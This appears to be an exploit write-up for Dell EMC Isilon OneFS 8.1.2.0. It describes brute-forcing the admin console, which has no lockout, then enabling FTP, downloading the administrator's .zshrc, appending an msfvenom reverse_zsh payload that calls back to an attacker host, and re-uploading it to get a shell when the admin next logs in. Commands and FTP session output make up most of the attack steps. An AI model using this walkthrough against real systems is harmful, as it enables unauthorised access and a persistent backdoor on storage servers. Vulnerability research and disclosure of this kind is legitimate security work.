# OneFS Storage Administration (DELL EMC Isilon)

## Bruteforcing The Console?

We should be able to bruteforce the console by using my custom script [isilon-onefs-brute.py](https://github.com/wetw0rk/Exploit-Development/blob/master/Personal-Exploits/DELL%20EMC%20OneFS%20Storage%20Administration%208.1.2.0%20-%20Authenticated%20RCE/isilon-onefs-brute.py) (tested on 8.1.2.0). I have tested 1379 invalid passwords with one valid at the end and got a valid response... this means there is no timeouts in place at least for the defualt install.

![alt text](https://github.com/wetw0rk/Exploit-Development/blob/master/Personal-Exploits/DELL%20EMC%20OneFS%20Storage%20Administration%208.1.2.0%20-%20Authenticated%20RCE/images/bruteforce.png)

## Exploitation Via FTP

When looking for exploits on exploit-db I found a submission from [Core Security](https://www.exploit-db.com/exploits/44039/) showing multiple vulnerabilities such as enabling SSH via CSRF. An issue we likely will face is that SSH is disabled or rather filtered on these hosts. So even if we enable SSH we will be unable to authenticate due to possible IP table rules. So I began looking for ways to get a shell without enabling SSH.

![alt text](https://github.com/wetw0rk/Exploit-Development/blob/master/Personal-Exploits/DELL%20EMC%20OneFS%20Storage%20Administration%208.1.2.0%20-%20Authenticated%20RCE/images/fssh.png)

### Enabling FTP

Once authenticated we can enable FTP by going to `Protocols` -> `FTP Settings` -> checking off `Enable FTP service, Enable server-to-server transfers` and save the changes. Now from here exploitation is straight forward.

![alt text](https://github.com/wetw0rk/Exploit-Development/blob/master/Personal-Exploits/DELL%20EMC%20OneFS%20Storage%20Administration%208.1.2.0%20-%20Authenticated%20RCE/images/ftp-settings.png)

### Exploitation

With FTP enabled we can simply login using the same credentials used for the console. Logged in we can see our current directory is the administrators home directory giving us access to `.zshrc`.

```
ftp> pwd
257 "/ifs/home/admin"
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp            16 Sep 20 08:11 .
drwxrwxr-x    4 ftp      ftp            28 Sep 20 08:11 ..
-rw-r--r--    1 ftp      ftp           659 Sep 20 08:11 .zshrc
226 Directory send OK.
ftp> get .zshrc
local: .zshrc remote: .zshrc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .zshrc (659 bytes).
226 Transfer complete.
659 bytes received in 0.00 secs (1.7654 MB/s)
ftp> bye
221 Goodbye.
```

Once downloaded we can simple append a reverse shell onto the `.zsrc` file.

```
root@kali:~# echo -ne "\n" >> .zshrc
root@kali:~# msfvenom -a cmd --platform unix -p cmd/unix/reverse_zsh LHOST=192.168.245.136 LPORT=443 -f raw >> .zshrc
No encoder or badchars specified, outputting raw payload
Payload size: 93 bytes

root@kali:~# echo -ne " &\n" >> .zshrc
```

Then we re-upload the new `.zshrc`. Be sure to backup the original.

```
ftp> rename .zshrc .backup
350 Ready for RNTO.
250 Rename successful.
ftp> put .zshrc
local: .zshrc remote: .zshrc
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
756 bytes sent in 0.00 secs (15.3400 MB/s)
ftp> bye
221 Goodbye.
```

Having a handler setup you now wait until the administrator logs in through SSH and we get a shell!

![alt text](https://github.com/wetw0rk/Exploit-Development/blob/master/Personal-Exploits/DELL%20EMC%20OneFS%20Storage%20Administration%208.1.2.0%20-%20Authenticated%20RCE/images/logged-in-shell.png)

This is what the administrator will see on his end.

![alt text](https://github.com/wetw0rk/Exploit-Development/blob/master/Personal-Exploits/DELL%20EMC%20OneFS%20Storage%20Administration%208.1.2.0%20-%20Authenticated%20RCE/images/admin-side.png)
